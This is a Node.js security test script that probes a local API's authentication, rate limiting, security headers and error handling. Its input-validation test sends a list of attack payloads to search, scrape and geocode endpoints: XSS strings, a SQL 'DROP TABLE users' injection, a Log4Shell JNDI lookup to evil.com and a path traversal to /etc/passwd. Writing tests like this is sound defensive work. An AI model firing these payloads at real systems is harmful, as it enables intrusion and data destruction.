#!/usr/bin/env node

/**
 * API Security Testing Script
 * Validates security implementations across all API endpoints
 */

const https = require('https')
const http = require('http')

const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3000'
const TEST_TIMEOUT = 10000

/**
 * Make HTTP request
 */
function makeRequest(options, data = null) {
  return new Promise((resolve, reject) => {
    const protocol = options.protocol === 'https:' ? https : http

    const req = protocol.request(options, res => {
      let body = ''
      res.on('data', chunk => (body += chunk))
      res.on('end', () => {
        try {
          const jsonBody = body ? JSON.parse(body) : {}
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: jsonBody,
          })
        } catch {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: body,
          })
        }
      })
    })

    req.on('error', reject)
    req.setTimeout(TEST_TIMEOUT, () => {
      req.destroy()
      reject(new Error('Request timeout'))
    })

    if (data) {
      req.write(JSON.stringify(data))
    }

    req.end()
  })
}

/**
 * Test authentication endpoints
 */
async function testAuthentication() {
  console.log('\n🔐 Testing Authentication...')

  const tests = [
    {
      name: 'Login with invalid credentials',
      request: {
        method: 'POST',
        path: '/api/auth',
        headers: { 'Content-Type': 'application/json' },
        data: { username: 'invalid', password: 'invalid' },
      },
      expectedStatus: 401,
    },
    {
      name: 'Login without credentials',
      request: {
        method: 'POST',
        path: '/api/auth',
        headers: { 'Content-Type': 'application/json' },
        data: {},
      },
      expectedStatus: 400,
    },
    {
      name: 'Check session without authentication',
      request: {
        method: 'GET',
        path: '/api/auth',
      },
      expectedStatus: 401,
    },
  ]

  for (const test of tests) {
    try {
      const url = new URL(BASE_URL + test.request.path)
      const options = {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: test.request.method,
        headers: test.request.headers || {},
      }

      const response = await makeRequest(options, test.request.data)

      if (response.status === test.expectedStatus) {
        console.log(`  ✅ ${test.name}`)
      } else {
        console.log(`  ❌ ${test.name} - Expected ${test.expectedStatus}, got ${response.status}`)
      }
    } catch (error) {
      console.log(`  ❌ ${test.name} - Error: ${error.message}`)
    }
  }
}

/**
 * Test input validation
 */
async function testInputValidation() {
  console.log('\n🛡️ Testing Input Validation...')

  const maliciousPayloads = [
    '<script>alert("xss")</script>',
    "'; DROP TABLE users; --",
    '${jndi:ldap://evil.com/a}',
    '../../../etc/passwd',
    'javascript:alert(1)',
    '<img src=x onerror=alert(1)>',
  ]

  const endpoints = [
    { path: '/api/search', method: 'POST', field: 'query' },
    { path: '/api/scrape', method: 'POST', field: 'url' },
    { path: '/api/geocode', method: 'POST', field: 'address' },
  ]

  for (const endpoint of endpoints) {
    for (const payload of maliciousPayloads) {
      try {
        const url = new URL(BASE_URL + endpoint.path)
        const data = {}
        data[endpoint.field] = payload

        const options = {
          hostname: url.hostname,
          port: url.port,
          path: url.pathname,
          method: endpoint.method,
          headers: { 'Content-Type': 'application/json' },
        }

        const response = await makeRequest(options, data)

        if (response.status === 400) {
          console.log(`  ✅ ${endpoint.path} rejected malicious ${endpoint.field}`)
        } else {
          console.log(
            `  ⚠️  ${endpoint.path} accepted malicious ${endpoint.field} (status: ${response.status})`
          )
        }
      } catch (error) {
        console.log(`  ❌ Error testing ${endpoint.path}: ${error.message}`)
      }
    }
  }
}

/**
 * Test rate limiting
 */
async function testRateLimiting() {
  console.log('\n⏱️ Testing Rate Limiting...')

  const endpoint = '/api/health'
  const requests = 10
  let rateLimited = false

  for (let i = 0; i < requests; i++) {
    try {
      const url = new URL(BASE_URL + endpoint)
      const options = {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: 'GET',
      }

      const response = await makeRequest(options)

      if (response.status === 429) {
        rateLimited = true
        console.log(`  ✅ Rate limiting triggered after ${i + 1} requests`)
        break
      }
    } catch (error) {
      console.log(`  ❌ Error in rate limit test: ${error.message}`)
      break
    }
  }

  if (!rateLimited) {
    console.log(`  ⚠️  Rate limiting not triggered after ${requests} requests`)
  }
}

/**
 * Test security headers
 */
async function testSecurityHeaders() {
  console.log('\n🔒 Testing Security Headers...')

  const requiredHeaders = ['x-content-type-options', 'x-frame-options', 'x-xss-protection']

  try {
    const url = new URL(BASE_URL + '/api/health')
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'GET',
    }

    const response = await makeRequest(options)

    for (const header of requiredHeaders) {
      if (response.headers[header]) {
        console.log(`  ✅ ${header}: ${response.headers[header]}`)
      } else {
        console.log(`  ❌ Missing security header: ${header}`)
      }
    }

    // Check for information disclosure headers
    const dangerousHeaders = ['server', 'x-powered-by']
    for (const header of dangerousHeaders) {
      if (response.headers[header]) {
        console.log(`  ⚠️  Information disclosure header present: ${header}`)
      } else {
        console.log(`  ✅ No ${header} header (good)`)
      }
    }
  } catch (error) {
    console.log(`  ❌ Error testing security headers: ${error.message}`)
  }
}

/**
 * Test error handling
 */
async function testErrorHandling() {
  console.log('\n🚨 Testing Error Handling...')

  const tests = [
    {
      name: 'Invalid JSON payload',
      request: {
        method: 'POST',
        path: '/api/search',
        headers: { 'Content-Type': 'application/json' },
        rawData: '{"invalid": json}',
      },
    },
    {
      name: 'Missing required fields',
      request: {
        method: 'POST',
        path: '/api/search',
        headers: { 'Content-Type': 'application/json' },
        data: {},
      },
    },
    {
      name: 'Invalid endpoint',
      request: {
        method: 'GET',
        path: '/api/nonexistent',
      },
    },
  ]

  for (const test of tests) {
    try {
      const url = new URL(BASE_URL + test.request.path)
      const options = {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: test.request.method,
        headers: test.request.headers || {},
      }

      const response = await makeRequest(options, test.request.data)

      // Check if error response doesn't leak sensitive information
      const bodyStr = JSON.stringify(response.body).toLowerCase()
      const sensitivePatterns = [
        'stack trace',
        'file path',
        'database',
        'password',
        'secret',
        'token',
      ]

      let leaksInfo = false
      for (const pattern of sensitivePatterns) {
        if (bodyStr.includes(pattern)) {
          leaksInfo = true
          break
        }
      }

      if (leaksInfo) {
        console.log(`  ⚠️  ${test.name} - May leak sensitive information`)
      } else {
        console.log(`  ✅ ${test.name} - Safe error response`)
      }
    } catch (error) {
      console.log(`  ❌ Error testing ${test.name}: ${error.message}`)
    }
  }
}

/**
 * Main test runner
 */
async function runSecurityTests() {
  console.log('🔍 API Security Test Suite')
  console.log('==========================')
  console.log(`Testing: ${BASE_URL}`)

  try {
    await testAuthentication()
    await testInputValidation()
    await testRateLimiting()
    await testSecurityHeaders()
    await testErrorHandling()

    console.log('\n✅ Security testing completed!')
    console.log('\n📋 Summary:')
    console.log('- Review any ⚠️  warnings above')
    console.log('- Fix any ❌ failures before deployment')
    console.log('- Ensure all ✅ tests are passing')
  } catch (error) {
    console.error('\n❌ Security testing failed:', error.message)
    process.exit(1)
  }
}

// Run tests if called directly
if (require.main === module) {
  runSecurityTests()
}

module.exports = {
  runSecurityTests,
  testAuthentication,
  testInputValidation,
  testRateLimiting,
  testSecurityHeaders,
  testErrorHandling,
}
